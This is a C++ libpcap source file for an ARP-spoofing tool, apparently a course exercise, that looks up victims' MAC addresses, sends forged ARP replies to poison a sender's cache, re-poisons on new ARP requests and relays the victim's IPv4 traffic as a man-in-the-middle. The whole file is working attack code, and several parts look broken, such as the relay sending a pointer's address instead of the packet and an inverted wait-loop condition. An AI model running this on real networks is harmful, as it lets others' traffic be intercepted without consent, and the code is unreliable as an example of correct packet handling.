#include <cstdio>
#include <pcap.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <net/if.h>
#include <unistd.h>
#include <map>
#include "ethhdr.h"
#include "arphdr.h"

#define MAC_LEN 6
#define IP_LEN 4

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: arp-spoof <interface> <sender ip> <target ip>\n");
	printf("sample: arp-spoof eth0 192.168.0.2 192.168.0.1\n");
}

void getMacAddress(Mac* uc_Mac, char* dev) {
   	int fd;
	
	struct ifreq ifr;
	char* iface = dev;
	uint8_t* mac;
	
	fd = socket(AF_INET, SOCK_DGRAM, 0);

	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name , iface , IFNAMSIZ-1);

	ioctl(fd, SIOCGIFHWADDR, &ifr);

	close(fd);

	mac = (uint8_t*)ifr.ifr_hwaddr.sa_data;

	*uc_Mac = Mac(mac);
}

void getIpAddress(Ip* uc_Ip, char* dev) {
	int fd;
	
	struct ifreq ifr;
	char* iface = dev;
	char* ip;

	fd = socket(AF_INET, SOCK_DGRAM, 0);

	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, iface, IFNAMSIZ-1);

	ioctl(fd, SIOCGIFADDR, &ifr);

	close(fd);

	uint32_t tempIp[IP_LEN] = {0};

	ip = inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
    sscanf(ip, "%d.%d.%d.%d", &tempIp[0], &tempIp[1], &tempIp[2], &tempIp[3]);

	*uc_Ip = Ip((tempIp[0] << 24) | (tempIp[1] << 16) | (tempIp[2] << 8) | (tempIp[3]));
}

int sendArp(pcap_t* handle, Mac ethdmac, Mac ethsmac, uint16_t op, Mac arpsmac, Ip arpsip, Mac arptmac, Ip arptip) {
	EthArpPacket packet;
	
	packet.eth_.dmac_ = Mac(ethdmac);
	packet.eth_.smac_ = Mac(ethsmac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(op);
	packet.arp_.smac_ = Mac(arpsmac);
	packet.arp_.sip_ = htonl(arpsip);
	packet.arp_.tmac_ = Mac(arptmac);
	packet.arp_.tip_ = htonl(arptip);

	return pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
}

int main(int argc, char* argv[]) {
	if (argc < 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	Mac broadcastDmac = Mac("FF:FF:FF:FF:FF:FF");
	Mac broadcastTmac = Mac("00:00:00:00:00:00");

	Mac senderMac;
	Mac targetMac;
	Mac myMac;
	Ip myIp;

	std::map <Ip, Mac> IpMacMap;

	// Get My Mac, Ip
	getMacAddress(&myMac, dev);
	getIpAddress(&myIp, dev);

	EthArpPacket arpreply;

	const u_char* rpacket;
	struct pcap_pkthdr* header;

	int res;

	for (int rep = 1; rep < argc - 1; rep += 2) {
		Ip senderIp = Ip(argv[rep + 1]);
		Ip targetIp = Ip(argv[rep + 2]);

		// Get Sender Mac
		if (IpMacMap.find(senderIp) != IpMacMap.end())
			senderMac = IpMacMap[senderIp];
		else {
			res = sendArp(handle, broadcastDmac, myMac, ArpHdr::Request, myMac, myIp, broadcastTmac, senderIp);
			if (res != 0) {
				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			}

			res = pcap_next_ex(handle, &header, &rpacket);
			arpreply = *(EthArpPacket*)rpacket;

			while (arpreply.eth_.type() != 0x0806 && arpreply.arp_.sip_ == senderIp) {
				res = pcap_next_ex(handle, &header, &rpacket);
				arpreply = *(EthArpPacket*)rpacket;
			}

			senderMac = arpreply.eth_.smac_;
			IpMacMap[senderIp] = senderMac;
		}

		// Get Target Mac
		if (IpMacMap.find(targetIp) != IpMacMap.end())
			targetMac = IpMacMap[targetIp];
		else {
			res = sendArp(handle, broadcastDmac, myMac, ArpHdr::Request, myMac, myIp, broadcastTmac, targetIp);
			if (res != 0) {
				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			}

			res = pcap_next_ex(handle, &header, &rpacket);
			arpreply = *(EthArpPacket*)rpacket;

			while (arpreply.eth_.type() != 0x0806 && arpreply.arp_.sip_ == targetIp) {
				res = pcap_next_ex(handle, &header, &rpacket);
				arpreply = *(EthArpPacket*)rpacket;
			}

			targetMac = arpreply.eth_.smac_;
			IpMacMap[targetIp] = targetMac;
		}

		// Attack
		res = sendArp(handle, senderMac, myMac, ArpHdr::Reply, myMac, targetIp, senderMac, senderIp);
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}

		// Relay
		EthArpPacket* relayPacket;
		
		while (true) {
			pcap_next_ex(handle, &header, &rpacket);
			relayPacket = (EthArpPacket*)rpacket;

			// infect check
			if (relayPacket->arp_.op() == ArpHdr::Request) {
				sleep(0.3);
				res = sendArp(handle, senderMac, myMac, ArpHdr::Reply, myMac, targetIp, senderMac, senderIp);
				if (res != 0) {
					fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
				}
			}


			if (relayPacket->eth_.smac_ == senderMac && relayPacket->eth_.type() == EthHdr::Ip4) {
				printf("arp \n");
				relayPacket->eth_.smac_ = myMac;
				relayPacket->eth_.dmac_ = targetMac;

				// if (relayPacket == (EthArpPacket*)rpacket)
				// 	printf("1\n");
				// else
				// 	printf("2\n");


				res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&relayPacket), sizeof(EthArpPacket));
				if (res != 0) {
					fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
				}
				else
					printf("hello\n");
			}




		}
	}

	pcap_close(handle);

}
